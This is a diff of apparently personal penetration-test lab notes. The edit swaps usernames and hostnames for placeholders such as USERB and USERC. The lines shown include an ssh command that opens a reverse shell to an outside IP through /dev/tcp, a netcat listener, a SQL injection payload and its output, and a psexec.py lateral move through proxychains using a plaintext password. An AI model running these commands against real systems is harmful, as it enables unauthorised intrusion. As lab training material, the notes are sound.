@@ -197,7 +197,7 @@ ssh root@10.10.11.227 -i id_rsa
 ##### Emumeration
 ##### Exploitation
 ````
-ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa bob@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USERB@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'
 
 nc -nvlp 443
 ````
@@ -1359,8 +1359,8 @@ https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pe
 Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
 ' OR 1=1 -- #query
 Blog entry from USERA with title The Great Escape from 2017
-Blog entry from Bob with title I Love Crypto from 2016
-Blog entry from Alice with title Man-in-the-middle from 2018
+Blog entry from USERB with title I Love Crypto from 2016
+Blog entry from USERC with title Man-in-the-middle from 2018
 Blog entry from USERA with title To Paris and Back from 2019
 Blog entry from Maria with title Software Development Lifecycle from 2018
 Blog entry from Eric with title Accounting is Fun from 2019
@@ -3318,7 +3318,7 @@ HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
 C:\>systeminfo
 systeminfo
 
-Host Name:                 BOB
+Host Name:                 USERB
 OS Name:                   Microsoft Windows XP Professional
 OS Version:                5.1.2600 Service Pack 1 Build 2600
 ````
@@ -3788,34 +3788,34 @@ System Type:               x64-based PC
 ````
 ### Pivoting
 #### psexec.py
-Using credentials that we wound for Alice we were able to psexec.py on my kali machine using chisel to Alices Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
+Using credentials that we wound for USERC we were able to psexec.py on my kali machine using chisel to USERCs Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
 ````
-proxychains psexec.py alice:aliceishere@10.11.1.50 cmd.exe
+proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
 ````
 ````
 C:\HFS>whoami
 whoami
-bethany\bethany
+USERL\USERL
 ````
 ````
-C:\Users\Bethany\Desktop>net user Bethany
+C:\Users\USERL\Desktop>net user USERL
 Local Group Memberships      *Users                
 Global Group memberships     *None                 
 The command completed successfully.
 ````
 ````
-C:\Users\Bethany\Desktop>net users
+C:\Users\USERL\Desktop>net users
 net users
 
-User accounts for \\BETHANY
+User accounts for \\USERL
 
 -------------------------------------------------------------------------------
-Admin            alice                    Bethany                  
+Admin            USERC                    USERL                  
 Guest                    
 The command completed successfully
 ````
 ````
-C:\Users\Bethany\Desktop>net user alice
+C:\Users\USERL\Desktop>net user USERC
 Local Group Memberships      *Admins       
 Global Group memberships     *None                 
 The command completed successfully.
